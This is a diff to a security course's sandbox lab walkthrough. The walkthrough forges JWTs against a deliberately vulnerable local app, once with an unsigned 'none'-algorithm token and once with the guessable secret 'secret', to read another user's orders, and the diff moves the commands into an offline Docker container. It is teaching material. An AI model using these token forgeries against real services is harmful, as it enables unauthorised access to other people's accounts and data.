@@ -1,13 +1,14 @@
 # Week 6 — Attack walkthrough (sandbox only)
 
-App runs on `http://localhost:8080`. Start it with `docker compose up`.
+App runs on `http://localhost:8080`. Build once while online with `docker compose build`, then start it with `docker compose up --no-build --pull never`.
 
 ## 0. Log in as alice (get a token)
 
 ```bash
 TOKEN=$(curl -s -X POST http://localhost:8080/login \
   -H 'Content-Type: application/json' \
-  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
+  -d '{"user":"alice","pw":"alicepw"}' | docker run --rm -i --network none kosen-swsec-week06:local \
+    python -c 'import sys,json;print(json.load(sys.stdin)["token"])')
 echo "$TOKEN"
 ```
 
@@ -29,12 +30,8 @@ In `solution_app.py` the second call returns `403 forbidden`.
 Mint an UNSIGNED token claiming to be bob. The vulnerable app allows `none`, so no secret is needed:
 
 ```bash
-FORGED=$(python3 - <<'PY'
-import jwt
-# alg 'none' produces an unsigned token; key must be empty for PyJWT.
-print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
-PY
-)
+FORGED=$(docker run --rm --network none kosen-swsec-week06:local \
+  python -c 'import jwt; print(jwt.encode({"sub":"bob"}, key="", algorithm="none"))')
 curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
 ```
 
@@ -43,11 +40,8 @@ curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
 Since the secret is the guessable string `secret`, anyone can sign a valid token:
 
 ```bash
-FORGED2=$(python3 - <<'PY'
-import jwt
-print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
-PY
-)
+FORGED2=$(docker run --rm --network none kosen-swsec-week06:local \
+  python -c 'import jwt; print(jwt.encode({"sub":"bob"}, "secret", algorithm="HS256"))')
 curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
 ```
 
